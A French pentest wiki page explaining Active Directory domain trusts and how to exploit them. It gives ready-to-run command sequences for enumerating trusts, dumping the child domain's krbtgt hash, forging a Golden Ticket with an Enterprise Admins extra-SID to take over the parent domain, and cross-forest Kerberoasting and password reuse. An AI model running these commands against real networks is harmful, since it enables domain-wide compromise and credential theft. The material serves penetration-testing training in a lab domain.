# Approbations de domaine

Les approbations (trusts) permettent aux utilisateurs d'un domaine d'acceder aux ressources d'un autre domaine. En pentest, compromettre un domaine enfant ouvre souvent la porte au domaine parent (et a la foret entiere) via les mecanismes d'approbation.

## Pourquoi

Les entreprises utilisent plusieurs domaines pour des raisons organisationnelles (filiales, departements) ou historiques (fusions, acquisitions). Les approbations entre ces domaines creent des chemins d'attaque transversaux. Compromettre un domaine enfant "moins critique" peut mener a la compromission de la foret entiere si l'approbation n'est pas correctement securisee.

## Comment ca marche

### Types d'approbations

| Type | Direction | Portee |
|---|---|---|
| Parent-Child | Bidirectionnelle, transitive | Automatique entre parent et enfant dans la meme foret |
| Cross-link | Bidirectionnelle ou unidirectionnelle | Entre domaines enfants pour raccourcir les chemins d'authentification |
| External | Unidirectionnelle, non transitive | Entre domaines de forets differentes |
| Forest | Bidirectionnelle ou unidirectionnelle, transitive | Entre deux forets distinctes |

{% hint style="info" %}
Les approbations intra-foret (parent-child) sont toujours bidirectionnelles et transitives. C'est le mecanisme le plus exploitable : compromettre n'importe quel domaine de la foret peut mener a la compromission du domaine racine.
{% endhint %}

### Enumerer les approbations

{% tabs %}
{% tab title="Linux" %}
```bash
# - Avec BloodHound (collecte les trusts automatiquement)
bloodhound-python -u '<USER>' -p '<PASSWORD>' -d INLANEFREIGHT.LOCAL \
    -ns <IP_DC> -c All

# - Avec Impacket
# Pas d'outil dedie, mais ldapsearch fonctionne
ldapsearch -x -H ldap://<IP_DC> -D '<USER>@INLANEFREIGHT.LOCAL' \
    -w '<PASSWORD>' -b "CN=System,DC=INLANEFREIGHT,DC=LOCAL" \
    "(objectClass=trustedDomain)" cn trustDirection trustType
```
{% endtab %}
{% tab title="Windows" %}
```powershell
# - PowerView
Import-Module .\PowerView.ps1
Get-DomainTrust
Get-DomainTrustMapping

# - Commande native
nltest /domain_trusts /all_trusts

# - Module ActiveDirectory
Get-ADTrust -Filter *
```
{% endtab %}
{% endtabs %}

### Attaque Child-to-Parent (escalade intra-foret)

L'attaque classique exploite le SID History pour creer un Golden Ticket contenant le SID du groupe Enterprise Admins du domaine parent.

**Prerequis** : compromission du domaine enfant (hash de krbtgt du domaine enfant + SID du domaine parent)

{% tabs %}
{% tab title="Linux" %}
```bash
# 1 - Obtenir le hash krbtgt du domaine enfant
secretsdump.py LOGISTICS.INLANEFREIGHT.LOCAL/'<DA>':'<PASSWORD>'@<IP_DC_CHILD> \
    -just-dc-user krbtgt

# 2 - Obtenir le SID du domaine parent
lookupsid.py LOGISTICS.INLANEFREIGHT.LOCAL/'<DA>':'<PASSWORD>'@<IP_DC_CHILD> \
    | grep "Domain SID"

# 3 - Obtenir le SID du groupe Enterprise Admins
lookupsid.py LOGISTICS.INLANEFREIGHT.LOCAL/'<DA>':'<PASSWORD>'@<IP_DC_PARENT> \
    | grep "Enterprise Admins"

# 4 - Generer un Golden Ticket avec SID History
ticketer.py -nthash <KRBTGT_HASH> -domain LOGISTICS.INLANEFREIGHT.LOCAL \
    -domain-sid <SID_CHILD> -extra-sid <SID_EA> Administrator

# 5 - Utiliser le ticket
export KRB5CCNAME=Administrator.ccache
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/Administrator@<DC_PARENT> \
    -k -no-pass -target-ip <IP_DC_PARENT>

# - Ou directement avec raiseChild.py (automatise tout)
raiseChild.py LOGISTICS.INLANEFREIGHT.LOCAL/'<DA>':'<PASSWORD>' \
    -target-exec <IP_DC_PARENT>
```
{% endtab %}
{% tab title="Windows" %}
```powershell
# 1 - Obtenir le SID du domaine enfant
Get-DomainSID

# 2 - Obtenir le SID du groupe Enterprise Admins du parent
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" |
    Select-Object objectsid

# 3 - Creer un Golden Ticket avec SID History (Mimikatz)
mimikatz# kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL `
    /sid:<SID_CHILD> /krbtgt:<KRBTGT_HASH> /sids:<SID_EA> /ptt

# 4 - Acceder au DC parent
ls \\<DC_PARENT>\c$
```
{% endtab %}
{% endtabs %}

### Attaque Cross-Forest

Les approbations entre forets sont plus restreintes : le SID History filtering bloque l'ajout de SID extra-domaine dans les tickets. L'exploitation repose sur les utilisateurs et groupes du domaine etranger qui ont des acces dans notre foret, ou sur les comptes avec le meme mot de passe dans les deux forets.

```bash
# - Enumerer les utilisateurs du domaine etranger avec des acces dans notre foret
bloodhound-python -u '<USER>' -p '<PASSWORD>' -d INLANEFREIGHT.LOCAL \
    -ns <IP_DC> -c All

# - Chercher des comptes avec le meme mot de passe
# Si on a compromis un utilisateur dans la foret A,
# tester les memes credentials dans la foret B
crackmapexec smb <IP_DC_FORET_B> -u '<USER>' -p '<PASSWORD>'

# - Kerberoasting cross-forest (si l'approbation le permet)
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL \
    INLANEFREIGHT.LOCAL/'<USER>':'<PASSWORD>' -request
```

{% hint style="warning" %}
Le SID History filtering est actif par defaut sur les approbations inter-forets. L'attaque Golden Ticket avec extra-SID ne fonctionne pas dans ce cas. Il faut trouver d'autres vecteurs : credentials reutilises, Kerberoasting cross-domain, ou ACL sur des objets du domaine etranger.
{% endhint %}

## En pratique

```bash
# Workflow child-to-parent

# 1 - Confirmer l'approbation
nltest /domain_trusts /all_trusts   # depuis Windows
# ou ldapsearch depuis Linux

# 2 - Compromettre le domaine enfant (DCSync)
secretsdump.py CHILD.DOMAIN.LOCAL/'<DA>':'<PASSWORD>'@<IP_DC_CHILD>

# 3 - Extraire krbtgt et SIDs
# krbtgt hash du domaine enfant
# SID du domaine enfant
# SID du groupe Enterprise Admins du parent

# 4 - raiseChild.py (automatise tout)
raiseChild.py CHILD.DOMAIN.LOCAL/'<DA>':'<PASSWORD>' \
    -target-exec <IP_DC_PARENT>

# 5 - Verifier l'acces au domaine parent
secretsdump.py -k -no-pass PARENT.DOMAIN.LOCAL/Administrator@<IP_DC_PARENT>
```

## Pieges et galeres

- **SID Filtering** : actif sur les trusts inter-forets, il bloque les extra-SID. Le child-to-parent intra-foret n'est PAS affecte
- **Selective Authentication** : certaines approbations limitent les serveurs accessibles. L'acces n'est pas automatique sur toutes les ressources
- **Clock skew** : les tickets Kerberos sont sensibles aux ecarts d'horloge. Synchroniser l'heure de la machine d'attaque avec le DC (`ntpdate`)
- **raiseChild.py** : outil puissant mais bruyant. Il automatise tout (DCSync child, Golden Ticket, DCSync parent) en une seule commande

## Retour terrain

L'escalade child-to-parent est un classique du pentest AD multi-domaine. La plupart des entreprises ne realisent pas que compromettre un domaine "test" ou "dev" qui est un enfant du meme arbre AD donne un acces direct au domaine racine de production. `raiseChild.py` d'Impacket rend cette attaque triviale. En cross-forest, c'est plus complexe : le SID filtering bloque l'approche directe, et il faut chercher des credentials reutilises ou des ACL cross-domain.

## Memo express

| Attaque | Prerequis | Outil Linux | Outil Windows |
|---|---|---|---|
| Child-to-Parent | DA du domaine enfant | raiseChild.py / ticketer.py | Mimikatz (golden + sids) |
| Kerberoasting cross-domain | Compte dans un domaine approuve | GetUserSPNs.py -target-domain | Rubeus |
| Enum trusts | Compte domaine | ldapsearch | Get-DomainTrust (PowerView) |
| DCSync parent | Golden Ticket avec extra-SID | secretsdump.py | Mimikatz dcsync |

***
